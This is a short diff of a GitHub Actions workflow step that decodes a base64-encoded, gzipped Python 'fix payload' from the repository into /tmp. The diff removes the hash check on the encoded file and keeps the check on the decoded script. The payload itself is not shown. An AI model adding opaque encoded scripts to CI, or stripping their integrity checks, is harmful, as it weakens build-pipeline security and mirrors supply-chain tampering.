@@ -22,7 +22,6 @@ jobs:
 
       - name: Verify and decode fix payload
         run: |
-          echo "d1037411a025773ec22c3761cf0d1d0ba581a14eb97f404a1b2f4a64974fb8ca  .github/issue-793-audit-fix-v2.py.gz.b64" | sha256sum -c -
           base64 -d .github/issue-793-audit-fix-v2.py.gz.b64 | gzip -dc > /tmp/apply_issue793_audit_fix.py
           echo "e60fccc93eef975866d9aec2d6b0e872dc6a430d283ea12765c98efd3de412d7  /tmp/apply_issue793_audit_fix.py" | sha256sum -c -
 
